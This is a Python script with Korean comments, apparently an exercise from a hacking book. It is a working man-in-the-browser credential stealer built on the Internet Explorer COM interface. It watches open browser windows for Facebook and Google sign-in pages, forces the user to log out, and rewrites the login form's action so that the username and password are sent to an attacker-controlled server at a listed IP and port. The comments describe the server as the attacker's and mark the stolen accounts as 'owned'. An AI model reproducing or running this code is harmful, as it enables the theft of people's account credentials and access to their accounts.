#-*- coding: utf-8 -*-
import win32com.client, urlparse, urllib, time

data_receiver="http://192.168.119.128:8080/" # ManInTheBrowserServer.py 를 실행하는 서버
target_sites={}
target_sites["www.facebook.com"]={
                                  "logout_url" : None, # GET 요청을 이용해 사용자가 로그아웃되도록 리다이렉션할 수 있는 URL
                                  "logout_form" : "logout_form", # 사용자를 로그아웃시킬 목적으로 제출할 수 있는 DOM 항목
                                  "login_form_index" : 0, # 수정할 로그인 폼을 포함하고 있는 타깃 도메인 DOM에서의 상대적 위치
                                  "owned" : False # 계정정보 탈취 여부를 나타내기위한 변수
                                  }
target_sites["accounts.google.com"]={
                                    "logout_url" : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
                                    "logout_form" : None,
                                    "login_form_index" : 0,
                                    "owned" : False
                                    }
target_sites["www.gmail.com"]=target_sites["accounts.google.com"]
target_sites["mail.google.com"]=target_sites["accounts.google.com"]
clsid="{9BA05972-F6A8-11CF-A442-00A0C90A8F39}" # 인터넷 익스플로러 클래스 ID
windows=win32com.client.Dispatch(clsid) # 인터넷 익스플로러 클래스 ID를 사용해 COM 객체의 인스터스 생성

def wait_for_browser(browser):
    while(browser.ReadyState != 4 and browser.ReadyState !="complete"):    
        time.sleep(0.1)
    return

def main():
    while True:
        for browser in windows:
            url=urlparse.urlparse(browser.LocationUrl)
            if url.hostname in target_sites:
                if(target_sites[url.hostname]["owned"]): # 공격을 이미 실행했는지 검사
                    continue
                if(target_sites[url.hostname]["logout_url"]): # 타겟 사이트에 바로 리다이렉션할 수 있는 로그아웃 URL이 있는지 검사 
                    browser.Navigate(target_sites[url.hostname]["logout_url"])
                    wait_for_browser(browser)
                else:
                    full_doc=browser.Document.all # 문서의 모든 항목 추출
                    for i in full_doc: # 로그아웃 폼 검색(폼을 제출해서 로그아웃해야 하는 경우)
                        try:
                            if(i.id==target_sites[url.hostname]["logout_form"]): # 로그아웃 폼에 등록된 HTML 항목 ID일 경우(로그아웃 폼을 발견했을 경우)
                                i.submit() # 해당 폼 제출
                                wait_for_browser(browser)
                        except:
                            pass
                try: # 로그인 폼 수정(아이디와 패스워드가 공격자 서버로 전송되도록 폼 수정)
                    login_index=target_sites[url.hostname]["login_form_index"]   
                    login_page=urllib.quote(browser.LocationUrl)
                    browser.Document.forms[login_index].action="%s%s" % (data_receiver, login_page)
                    target_sites[url.hostname]["owned"]=True
                except:
                    pass
        time.sleep(5) # 사용자가 로그인할 때까지 대기
            
if __name__=="__main__":
    main()